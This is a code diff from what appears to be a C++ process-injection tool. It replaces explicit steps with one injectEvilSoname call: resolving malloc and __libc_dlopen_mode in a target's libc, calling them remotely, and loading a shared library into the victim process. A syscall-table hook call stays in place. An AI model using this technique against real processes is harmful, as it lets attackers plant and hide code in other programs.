@@ -28,34 +28,9 @@ int main(int argc, char *argv[])
         LOGGER_ERROR << "attachTarget";
         return 0;
     }
-    if (!infector.loadSoFile(LIBC_SO))
-    {
-        LOGGER_ERROR << "loadSoFile";
-        return 0;
-    }
-    Elf64_Addr mallocAddr = infector.getSym(LIBC_SO, "malloc");
-    Elf64_Addr dlopenAddr = infector.getSym(LIBC_SO, "__libc_dlopen_mode");
-    Elf64_Addr exitAddr = infector.getSym(LIBC_SO, "exit");
-  
-    Elf64_Addr retAddr = infector.callRemoteFunc(mallocAddr, 1000);
- 
-    if (!infector.writeStrToTarget(retAddr, injectso))
-    {
-        LOGGER_ERROR << "writeStrToTarget";
-        return 0;
-    }
 
+    infector.injectEvilSoname(injectso);
 
-    //infector.createThread(exitAddr, 0);
-
-    retAddr = infector.callRemoteFunc(dlopenAddr, retAddr, RTLD_NOW|RTLD_GLOBAL, 0);
-
-    if (!infector.loadSoFile("libinject.so"))
-    {
-        LOGGER_ERROR << "loadSoFile";
-        return 0;
-    }
-                                                                   
     infector.injectSysTableInit();
 
     if (!infector.detachTarget())
